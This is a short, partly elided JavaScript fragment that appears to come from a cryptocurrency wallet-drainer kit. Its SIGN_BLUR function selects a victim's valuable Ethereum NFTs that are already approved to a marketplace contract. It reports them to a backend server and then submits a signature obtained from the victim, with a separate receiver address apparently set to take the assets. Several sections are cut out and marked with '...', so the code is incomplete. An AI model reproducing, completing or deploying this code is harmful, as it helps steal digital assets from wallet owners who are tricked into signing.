const SIGN_BLUR = async (assets, provider, sender_address, receiver_address, user_id, min_price = 0) => {
  try {
    const nft_list = [], nft_list_plain = [];
    for (const asset of assets) {
      if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1 || asset.amount_usd < min_price) continue;
      if (!await is_nft_approved(asset.address, sender_address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8")) continue;
    ...
    let response = await send_request({ action: 'blur', user_id: user_id, blur: 'root', tokens: nft_list, address: sender_address });
    try {
      ...
      await send_request({
        ...
        signature: signature, address: sender_address,
